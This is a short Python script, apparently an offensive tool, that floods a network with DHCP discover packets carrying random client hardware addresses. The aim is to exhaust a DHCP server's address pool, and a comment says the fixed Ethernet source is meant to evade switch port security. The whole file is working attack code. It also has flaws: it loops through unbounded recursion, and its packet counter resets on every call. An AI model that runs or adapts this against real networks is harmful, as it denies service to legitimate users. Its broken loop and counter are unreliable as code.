from scapy.all import *
from randmac import RandMac

def flood():
    packets_sent = 0
    
    try:
        #Generate a random source mac address with randmac and retrieve interface to send packet out
        src_mac = bytes(str(RandMac()), 'utf-8')
        address_family,mac = get_if_raw_hwaddr(conf.iface)
        
        #Crafting and sending of packet (Only DHCP src_mac changes to avoid port security)
        dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=src_mac)/DHCP(options=[("message-type","discover"),"end"])
        sendp(dhcp_discover)
        
        packets_sent += 1
        print(f"Sent {packets_sent} packets")
        
        return flood()
    
    except KeyboardInterrupt:
        print(f"Crtl+C detected.\nFlood Ended\nTotal DHCP discover packets sent: {packets_sent}")
        

def main():
    print("Flood Starting, press Crtl+C to stop.")
    flood()


if __name__ == "__main__":
    main()